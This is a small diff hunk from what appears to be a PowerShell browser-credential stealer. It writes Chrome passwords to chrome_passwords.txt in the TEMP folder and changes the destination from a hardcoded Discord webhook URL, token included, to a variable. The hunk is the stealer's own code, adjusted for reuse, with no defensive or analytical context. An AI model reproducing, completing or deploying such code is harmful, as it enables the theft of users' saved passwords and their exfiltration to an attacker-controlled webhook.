@@ -19,7 +19,7 @@ if ((Get-Host).Version.Major -eq 7) {
 }
 
 $outputFilePath = "$env:TEMP\chrome_passwords.txt"  # Output file path
-$hookUrl = "https://discord.com/api/webhooks/1245593813796393033/2Ojd6zl2l3mta9lGTV2dpehiLOK3yeXVCr9ygJiR64DOStEOYS6SH9rWEsW-Mi6IpRCB"
+$hookUrl = "$dc"
 
 # Function to append data to the output file
 function AppendToFile {
